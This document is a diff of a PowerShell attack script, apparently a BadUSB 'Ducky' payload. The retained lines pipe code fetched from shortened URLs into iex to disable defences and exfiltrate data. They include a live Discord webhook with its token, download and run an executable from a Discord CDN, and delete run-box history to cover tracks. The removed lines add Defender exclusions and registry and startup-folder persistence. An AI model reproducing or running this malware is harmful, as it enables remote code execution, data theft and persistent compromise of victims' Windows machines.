@@ -20,13 +20,9 @@ $consolePtr = [User32]::GetConsoleWindow();
 
 #Disable
 irm https://rb.gy/vrt4s6 | iex;
-Start-Sleep -Seconds 5;
 
 #Ducky-Exfil
 irm https://rb.gy/xzpj1d | iex;
-
-#Exclusions
-Set-ExecutionPolicy Unrestricted -Force;  Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionExtension ".exe";
 
 #Lasania
 $webhook = "https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f";
@@ -35,34 +31,6 @@ $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo 77u/JElzQWRtaW
 
 #Disto
 Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1269444822612181054/distopan.exe?ex=66b0161e&is=66aec49e&hm=1e4d002fc89f532ae6b53f298bcacf892700f1e8137fa1f43cafcab59bdd8591&" -OutFile "$env:temp\distopi.exe"; powershell "$env:temp\distopi.exe";
-
-# Función para agregar persistencia mediante el registro de Windows
-function Add-RegistryPersistence {
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $name = "DistopiaPersistence"
-    $value = "$env:TEMP\distopi.exe"
-    
-    if (-not (Test-Path $regPath)) {
-        New-Item -Path $regPath -Force | Out-Null
-    }
-    Set-ItemProperty -Path $regPath -Name $name -Value $value
-}
-
-# Función para agregar persistencia mediante la carpeta de inicio
-function Add-StartupFolderPersistence {
-    $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\distopi.lnk")
-    $shell = New-Object -ComObject WScript.Shell
-    $shortcut = $shell.CreateShortcut($startupPath)
-    $shortcut.TargetPath = "$env:TEMP\distopi.exe"
-    $shortcut.Save()
-}
-
-# Llamada a las funciones para agregar persistencia
-Add-RegistryPersistence
-Add-StartupFolderPersistence
-
-
-Start-Sleep -Seconds 5;
 
 # 1delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f ;
